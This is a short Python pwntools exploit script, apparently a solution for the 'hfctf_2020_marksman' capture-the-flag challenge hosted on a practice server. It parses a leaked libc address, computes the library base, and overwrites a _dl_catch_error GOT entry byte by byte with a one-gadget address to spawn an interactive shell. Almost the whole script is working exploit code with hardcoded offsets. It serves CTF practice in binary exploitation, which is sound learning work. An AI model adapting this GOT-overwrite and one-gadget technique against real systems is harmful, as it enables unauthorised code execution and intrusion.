from pwn import *


# if you want to debug this pwn in your own env.
# please use ubuntu18.04, or else the offset in the libdl.so.2 
# will be diff from remote

libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
# p = process([ld_path, "./hfctf_2020_marksman"], env={"LD_PRELOAD": libc_path})
# p = process("./marksman", env={"LD_PRELOAD": libc_path})
p = remote("node4.buuoj.cn", 26830)


# leak libc and count
p.recvuntil("I placed the target near: ")
info = int(p.recvuntil("\n"), 16)
print("leak: ", hex(info))

libc_path = "./libc-2.27-64.so"
libc = ELF(libc_path)
base = info-libc.sym["puts"]
print("base: ", hex(base))

# attack 
libc_got = base+0x5f4038  # _dl_catch_error@got
oneshot = base+0xe569f
print("oneshot: ", hex(oneshot))

p.sendlineafter("shoot!shoot!\n", str(libc_got))
p.sendlineafter("biang!\n", chr(oneshot & 0xff))
p.sendlineafter("biang!\n", chr((oneshot >> 8) & 0xff))
p.sendlineafter("biang!\n", chr((oneshot >> 16) & 0xff))

p.interactive()


